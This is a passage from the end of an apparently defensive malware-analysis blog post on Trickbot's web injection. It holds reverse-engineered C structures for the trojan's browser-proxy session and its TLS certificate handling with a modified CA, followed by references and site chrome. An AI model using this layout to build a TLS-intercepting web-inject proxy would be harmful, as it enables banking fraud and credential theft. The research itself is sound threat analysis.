</span><span style=color:#75715e></span>                                     <span style=color:#75715e>//   If the browser uses SOCKS, this will be
</span><span style=color:#75715e></span>                                     <span style=color:#75715e>//   the SOCKS server address
</span><span style=color:#75715e></span>  BYTE unused1[<span style=color:#ae81ff>0x20</span>];  
  QWORD ProxySOCKET;                 <span style=color:#75715e>// SOCKET for Browser &lt;-&gt; Proxy communication
</span><span style=color:#75715e></span>  QWORD WebsiteSOCKET;               <span style=color:#75715e>// SOCKET for Proxy &lt;-&gt; Website communication
</span><span style=color:#75715e></span>  QWORD pBrowserRequest;             <span style=color:#75715e>// Browser&#39;s request sent to Proxy
</span><span style=color:#75715e></span>  QWORD pProxyRequest;               <span style=color:#75715e>// Proxy&#39;s request sent to website
</span><span style=color:#75715e></span>                                     <span style=color:#75715e>//   The request is a modification of 
</span><span style=color:#75715e></span>                                     <span style=color:#75715e>//   the browser&#39;s request
</span><span style=color:#75715e></span>  QWORD pHTTPS_URL;                  <span style=color:#75715e>// Website&#39;s HTTPS URL
</span><span style=color:#75715e></span>  QWORD pWebsiteResponse;            <span style=color:#75715e>// Website&#39;s response
</span><span style=color:#75715e></span>  QWORD pSSLDomainName;              <span style=color:#75715e>// Website&#39;s Domain name
</span><span style=color:#75715e></span>  QWORD szBrowserRequest;            <span style=color:#75715e>// Browser&#39;s request size
</span><span style=color:#75715e></span>  QWORD szProxyRequest;              <span style=color:#75715e>// Proxy&#39;s request size
</span><span style=color:#75715e></span>  QWORD szWebsiteResponse;           <span style=color:#75715e>// Website&#39;s response size
</span><span style=color:#75715e></span>  QWORD pWebsiteResponse_dinj_sinj;  <span style=color:#75715e>// Website&#39;s response in case of dinj 
</span><span style=color:#75715e></span>                                     <span style=color:#75715e>//   or sinj config
</span><span style=color:#75715e></span>  QWORD szSSLDomainName;             <span style=color:#75715e>// Website&#39;s Domain name size
</span><span style=color:#75715e></span>  BYTE unused2[<span style=color:#ae81ff>8</span>];
  BOOL SSLDetected;                  <span style=color:#75715e>// If SSL is detected
</span><span style=color:#75715e></span>  BOOL SINJ;                         <span style=color:#75715e>// If the config is sinj
</span><span style=color:#75715e></span>  BOOL DINJ;                         <span style=color:#75715e>// If the config is dinj
</span><span style=color:#75715e></span>  BROWSER_TYPE BrowserType;          <span style=color:#75715e>// Browser type
</span><span style=color:#75715e></span>  HTTP_VERB verb;                    <span style=color:#75715e>// Request verb used by the browser
</span><span style=color:#75715e></span>  DWORD BrowserPID;                  <span style=color:#75715e>// Browser&#39;s PID
</span><span style=color:#75715e></span>};

<span style=color:#75715e>/*
</span><span style=color:#75715e>    Structure that stores information for making SSPI connections.
</span><span style=color:#75715e>
</span><span style=color:#75715e>    Connections between browser &lt;-&gt; Proxy and Proxy &lt;-&gt; website 
</span><span style=color:#75715e>    each have a tk__cert_context.
</span><span style=color:#75715e>*/</span>
<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>tk__cert_context</span>{
    SOCKET socket;                            <span style=color:#75715e>// The socket is either ProxySOCKET 
</span><span style=color:#75715e></span>                                              <span style=color:#75715e>//  or the WebsiteSOCKET (taken 
</span><span style=color:#75715e></span>                                              <span style=color:#75715e>//  from tk__session)
</span><span style=color:#75715e></span>    _SecHandle hCredential;                   <span style=color:#75715e>// Handle to the credentials used to 
</span><span style=color:#75715e></span>                                              <span style=color:#75715e>//  establish a schannel security context
</span><span style=color:#75715e></span>    _SecHandle hContext;                      <span style=color:#75715e>// Handle to the security context
</span><span style=color:#75715e></span>    QWORD pwebsiteCertContext;                <span style=color:#75715e>// If the communication is Browser &lt;-&gt; Proxy
</span><span style=color:#75715e></span>                                              <span style=color:#75715e>//  Then a modified website&#39;s certificate 
</span><span style=color:#75715e></span>                                              <span style=color:#75715e>//  context is used. If the communication is 
</span><span style=color:#75715e></span>                                              <span style=color:#75715e>//  Proxy &lt;-&gt; Website, then the original 
</span><span style=color:#75715e></span>                                              <span style=color:#75715e>//  website&#39;s certificate context is used
</span><span style=color:#75715e></span>    QWORD pClientCertContext;                 <span style=color:#75715e>// The proxy&#39;s localhost certificate context
</span><span style=color:#75715e></span>                                              <span style=color:#75715e>//  which is used as the client&#39;s certificate
</span><span style=color:#75715e></span>                                              <span style=color:#75715e>//  when the communication is Proxy &lt;-&gt; Website
</span><span style=color:#75715e></span>    QWORD pCACertContext;                     <span style=color:#75715e>// The modified self-signed CA certificate 
</span><span style=color:#75715e></span>                                              <span style=color:#75715e>//  context    
</span><span style=color:#75715e></span>    BOOL HandshakeResult;                     <span style=color:#75715e>// If a connection is established 
</span><span style=color:#75715e></span>    _SecPkgContext_StreamSizes StreamSizes;   <span style=color:#75715e>// The maximum size that can be encrypted
</span><span style=color:#75715e></span>    QWORD pReceiveBuffer;                     <span style=color:#75715e>// Message received by Proxy
</span><span style=color:#75715e></span>    QWORD szReceiveBuffer;                    <span style=color:#75715e>// Received message size
</span><span style=color:#75715e></span>    QWORD ReceiveBufferBytesRead;             <span style=color:#75715e>// Number of bytes read
</span><span style=color:#75715e></span>    QWORD pSendBuffer;                        <span style=color:#75715e>// Message sent by Proxy
</span><span style=color:#75715e></span>    QWORD szSendBuffer;                       <span style=color:#75715e>// Sent message size
</span><span style=color:#75715e></span>    QWORD SendBufferBytesSent;                <span style=color:#75715e>// Number of bytes sent 
</span><span style=color:#75715e></span>}
</code></pre></div><h1 id=references>References</h1><section class=footnotes role=doc-endnotes><hr><ol><li id=fn:1 role=doc-endnote><p><a href=https://www.kryptoslogic.com/blog/2021/07/trickbot-and-zeus/>https://www.kryptoslogic.com/blog/2021/07/trickbot-and-zeus/</a>&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2 role=doc-endnote><p><a href=https://certificate.transparency.dev/howctworks/>https://certificate.transparency.dev/howctworks/</a>&#160;<a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3 role=doc-endnote><p><a href=https://www.crowdstrike.com/blog/bokbots-man-in-the-browser-overview/>https://www.crowdstrike.com/blog/bokbots-man-in-the-browser-overview/</a>&#160;<a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4 role=doc-endnote><p><a href=https://cyber.wtf/2017/02/03/zeus-panda-webinjects-a-case-study/>https://cyber.wtf/2017/02/03/zeus-panda-webinjects-a-case-study/</a>&#160;<a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5 role=doc-endnote><p><a href=https://en.wikipedia.org/wiki/SOCKS>https://en.wikipedia.org/wiki/SOCKS</a>&#160;<a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6 role=doc-endnote><p><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept-Encoding>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Accept-Encoding</a>&#160;<a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:7 role=doc-endnote><p><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT</a>&#160;<a href=#fnref:7 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:8 role=doc-endnote><p><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Public-Key-Pins>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Public-Key-Pins</a>&#160;<a href=#fnref:8 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:9 role=doc-endnote><p><a href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Public-Key-Pins-Report-Only>https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Public-Key-Pins-Report-Only</a>&#160;<a href=#fnref:9 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:10 role=doc-endnote><p><a href=https://docs.microsoft.com/en-us/windows/win32/secauthn/sspi>https://docs.microsoft.com/en-us/windows/win32/secauthn/sspi</a>&#160;<a href=#fnref:10 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:11 role=doc-endnote><p><a href="https://www.botconf.eu/wp-content/uploads/2018/12/2018-F-Bacurio-Junior-J-Salvio-Trickbot-The-Trick-is-On-You-presented.pdf#page=11">https://www.botconf.eu/wp-content/uploads/2018/12/2018-F-Bacurio-Junior-J-Salvio-Trickbot-The-Trick-is-On-You-presented.pdf#page=11</a>&#160;<a href=#fnref:11 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:12 role=doc-endnote><p><a href=https://depthsecurity.com/blog/reflective-dll-injection-in-c>https://depthsecurity.com/blog/reflective-dll-injection-in-c</a>&#160;<a href=#fnref:12 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:13 role=doc-endnote><p><a href=https://github.com/mozilla/spidernode/blob/master/deps/spidershim/spidermonkey/mozglue/build/WindowsDllBlocklist.cpp#L808>https://github.com/mozilla/spidernode/blob/master/deps/spidershim/spidermonkey/mozglue/build/WindowsDllBlocklist.cpp#L808</a>&#160;<a href=#fnref:13 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:14 role=doc-endnote><p><a href=https://www.f5.com/labs/articles/threat-intelligence/little-trickbot-growing-up-new-campaign-24412>https://www.f5.com/labs/articles/threat-intelligence/little-trickbot-growing-up-new-campaign-24412</a>&#160;<a href=#fnref:14 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:15 role=doc-endnote><p><a href=https://nodejs.org/en/docs/guides/debugging-getting-started/>https://nodejs.org/en/docs/guides/debugging-getting-started/</a>&#160;<a href=#fnref:15 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:16 role=doc-endnote><p><a href=https://docs.microsoft.com/en-us/windows/win32/api/mswsock/nc-mswsock-lpfn_connectex>https://docs.microsoft.com/en-us/windows/win32/api/mswsock/nc-mswsock-lpfn_connectex</a>&#160;<a href=#fnref:16 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:17 role=doc-endnote><p><a href=https://developers.google.com/web/fundamentals/performance/http2>https://developers.google.com/web/fundamentals/performance/http2</a>&#160;<a href=#fnref:17 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:18 role=doc-endnote><p><a href="https://www.virusbulletin.com/uploads/pdf/conference_slides/2017/Kalnai-VB2017-browser-attack-points-trojans.pdf#page=8">https://www.virusbulletin.com/uploads/pdf/conference_slides/2017/Kalnai-VB2017-browser-attack-points-trojans.pdf#page=8</a>&#160;<a href=#fnref:18 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:19 role=doc-endnote><p><a href="https://docs.microsoft.com/en-us/dynamics365/unified-service-desk/admin/internet-explorer-settings-bpa?view=dynamics-usd-4.2">https://docs.microsoft.com/en-us/dynamics365/unified-service-desk/admin/internet-explorer-settings-bpa?view=dynamics-usd-4.2</a>&#160;<a href=#fnref:19 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:20 role=doc-endnote><p><a href=https://docs.microsoft.com/en-us/troubleshoot/developer/browsers/administration/32-bit-browser-applications-not-working-as-expected>https://docs.microsoft.com/en-us/troubleshoot/developer/browsers/administration/32-bit-browser-applications-not-working-as-expected</a>&#160;<a href=#fnref:20 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:21 role=doc-endnote><p><a href=https://github.com/Visgean/Zeus/blob/translation/manual_en.html>https://github.com/Visgean/Zeus/blob/translation/manual_en.html</a>&#160;<a href=#fnref:21 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></section></p></div></div></div><div class=col-lg-3><div class=blog-post-widget><h2>Connect with Kryptos</h2><ul class=blog-social-list><li class=social--email><a href="/cdn-cgi/l/email-protection#21525451514e5355614a535851554e524d4e4648420f424e4c" title="Kryptos Logic Support Email" target=_blank><i class="fas fa-envelope"></i></a></li><li class=social--twitter><a href=https://twitter.com/kryptoslogic title="Kryptos Logic on Twitter" target=_blank><i class="fab fa-twitter"></i></a></li><li class=social--linkedin><a href=https://www.linkedin.com/company/kryptos-logic title="Kryptos Logic on Linkedin" target=_blank><i class="fab fa-linkedin"></i></a></li><li class=social--github><a href=https://github.com/kryptoslogic title="Kryptos Logic on GitHub" target=_blank><i class="fab fa-github"></i></a></li><li class=social--github><a href=https://www.kryptoslogic.com/blog/index.xml title="Blog Posts RSS"><i class="fas fa-rss"></i></a></li></ul></div><div class=blog-post-widget><h2>Recent Posts</h2><ul><li><a href=/blog/2022/01/deep-dive-into-trickbots-web-injection/>Deep Dive into Trickbot's Web Injection</a>, 24 Jan, 2022</li><li><a href=/blog/2021/07/adjusting-the-anchor/>Adjusting the Anchor</a>, 15 Jul, 2021</li><li><a href=/blog/2021/07/trickbot-and-zeus/>TrickBot and Zeus</a>, 01 Jul, 2021</li><li><a href=/blog/2021/02/trickbot-masrv-module/>TrickBot masrv Module</a>, 01 Feb, 2021</li><li><a href=/blog/2021/01/faster-poly1305-key-multicollisions/>Faster Poly1305 key multicollisions</a>, 13 Jan, 2021</li></ul></div><div class=blog-post-widget><h2>Categories</h2><ul><li><a href=https://www.kryptoslogic.com/blog/category/malware>malware</a> (14)</li><li><a href=https://www.kryptoslogic.com/blog/category/crypto>crypto</a> (3)</li><li><a href=https://www.kryptoslogic.com/blog/category/linux>linux</a> (1)</li><li><a href=https://www.kryptoslogic.com/blog/category/program-analysis>program-analysis</a> (1)</li><li><a href=https://www.kryptoslogic.com/blog/category/reverse-engineering>reverse-engineering</a> (1)</li><li><a href=https://www.kryptoslogic.com/blog/category/vulnerability>vulnerability</a> (1)</li></ul></div><div class=blog-post-widget><h2>Tags</h2><ul><li><a href=https://www.kryptoslogic.com/blog/tag/emotet>emotet</a> (4)</li><li><a href=https://www.kryptoslogic.com/blog/tag/trickbot>trickbot</a> (3)</li><li><a href=https://www.kryptoslogic.com/blog/tag/wannacry>wannacry</a> (3)</li><li><a href=https://www.kryptoslogic.com/blog/tag/exploit>exploit</a> (2)</li><li><a href=https://www.kryptoslogic.com/blog/tag/anchor>anchor</a> (1)</li><li><a href=https://www.kryptoslogic.com/blog/tag/bluekeep>bluekeep</a> (1)</li><li><a href=https://www.kryptoslogic.com/blog/tag/coinmining>coinmining</a> (1)</li><li><a href=https://www.kryptoslogic.com/blog/tag/cve-2020-0609>cve-2020-0609</a> (1)</li><li><a href=https://www.kryptoslogic.com/blog/tag/cve-2020-0610>cve-2020-0610</a> (1)</li><li><a href=https://www.kryptoslogic.com/blog/tag/petya>petya</a> (1)</li></ul></div></div></div></div></div></div><div class=footer><div class=container><div class=row><div class=col-12><div class=footer-inner><h3 class=footer-title>Kryptos Logic</h3></div></div></div></div><div class=sub-footer><div class=container><ul class=footer-social-list><li class=social--email><a href="/cdn-cgi/l/email-protection#22515752524d50566249505b52564d514e4d454b410c414d4f" title="Kryptos Logic Support Email" target=_blank><i class="fas fa-envelope"></i></a></li><li class=social--twitter><a href=https://twitter.com/kryptoslogic title="Kryptos Logic on Twitter" target=_blank><i class="fab fa-twitter"></i></a></li><li class=social--linkedin><a href=https://www.linkedin.com/company/kryptos-logic title="Kryptos Logic on Linkedin" target=_blank><i class="fab fa-linkedin"></i></a></li><li class=social--github><a href=https://github.com/kryptoslogic title="Kryptos Logic on GitHub" target=_blank><i class="fab fa-github"></i></a></li></ul><ul><li>Â© 2025 Kryptos Logic</li><li><a href=https://www.kryptoslogic.com/blog>Blog</a></li><li><a href=https://www.kryptoslogic.com/contact>Support</a></li><li><a href=https://www.kryptoslogic.com/terms>Terms</a></li><li><a href=https://www.kryptoslogic.com/privacy>Privacy</a></li><li><a href=https://www.kryptoslogic.com/jobs>Jobs</a></li></ul></div></div></div><script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js integrity="sha256-pTxD+DSzIwmwhOqTFN+DB+nHjO4iAsbgfyFq5K5bcE0=" crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js integrity="sha256-fzFFyH01cBVPYzl16KT40wqjhgPtq6FFUB6ckN2+GGw=" crossorigin=anonymous></script><script type=text/javascript src=/js/bundle.min.c8d5dd0eddb1cc4e0507a2b1c83f71c19a0fc6d71d14d7ad9dc9a9c89b5f7ab6.js></script></body></html>